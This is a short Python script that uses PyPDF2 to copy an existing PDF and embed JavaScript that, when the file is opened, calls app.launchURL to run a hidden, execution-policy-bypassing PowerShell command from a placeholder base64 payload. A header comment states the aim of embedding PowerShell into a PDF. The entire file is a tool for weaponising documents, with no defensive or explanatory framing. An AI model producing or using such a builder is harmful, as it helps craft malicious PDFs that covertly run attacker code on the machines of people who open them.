//THIS FILE IS GONNA CONVERT POWER SHELL INTO THE EMBBEDED PDF

import PyPDF2

# Replace these with your actual file names and base64 payload
input_pdf_path = 'input.pdf'      # Your existing PDF file
output_pdf_path = 'output.pdf'    # The new PDF file to create
base64_payload = '<BASE64_STRING>'  # Your base64 encoded PowerShell script

# JavaScript to launch the PowerShell payload
js_code = f'app.launchURL("powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {base64_payload}", true);'

def embed_javascript(input_pdf, output_pdf, javascript):
    with open(input_pdf, 'rb') as infile:
        reader = PyPDF2.PdfReader(infile)
        writer = PyPDF2.PdfWriter()

        # Copy all pages from the original PDF
        for page in reader.pages:
            writer.add_page(page)

        # Add JavaScript to the PDF
        writer.add_js(javascript)

        # Write the new PDF with JavaScript embedded
        with open(output_pdf, 'wb') as outfile:
            writer.write(outfile)

    print(f"JavaScript embedded and saved to {output_pdf}")

if __name__ == "__main__":
    embed_javascript(input_pdf_path, output_pdf_path, js_code)
